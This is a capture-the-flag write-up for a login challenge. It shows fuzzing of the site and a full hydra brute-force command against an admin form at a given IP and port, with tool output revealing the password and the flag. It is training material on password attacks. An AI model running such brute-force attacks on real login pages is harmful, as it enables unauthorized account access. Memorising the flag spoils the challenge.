# letmein (🪙 991)

Lastpass went bankrupt and i only got a list of all my passwords when they closed down. I cant remember which password i used to log in to my admin page. There are too many options, and i dont have the time to try them all. You are like a hacker, right? Log me in while i go to lunch, thanks.

Oh, the username is admin.

http://51.20.45.230:4001/

# Writeup

Opened, saw the index.php, script.js gives 404. Not much here to look at Doing a quick fuzz shows me:

```
flag.php
index.php
index.html
```

Headers shows Apache/2.4.52, canot find any quick vuln in exploitdb for that.

He gives me the user which makes me think I should brute. Starting hydra on it. First I tried rockyou but I dont have 40+ hours. Got a tip to use a smaller file. Had a lot of different ones so used this letter passwds first. Seems to be about 50k. 

```bash
hydra -I -l admin -P /usr/share/wordlists/SecLists/Passwords/Most-Popular-Letter-Passes.txt -u 51.20.45.230 -s 4001 http-post-form "/index.php:username=^USER^&password=^PASS^:F=failed"
```

After a while I got success on `nuts`. 

```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-09 23:28:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 47603 login tries (l:1/p:47603), ~2976 tries per task
[DATA] attacking http-post-form://51.20.45.230:4001/index.php:username=^USER^&password=^PASS^:F=failed
[STATUS] 3276.00 tries/min, 3276 tries in 00:01h, 44327 to do in 00:14h, 16 active
[STATUS] 3331.33 tries/min, 9994 tries in 00:03h, 37609 to do in 00:12h, 16 active
[STATUS] 3333.71 tries/min, 23336 tries in 00:07h, 24267 to do in 00:08h, 16 active
[4001][http-post-form] host: 51.20.45.230   login: admin   password: nuts
``````

# Flag

```
siktCTF{NUT5_4_TH0UGHT}
```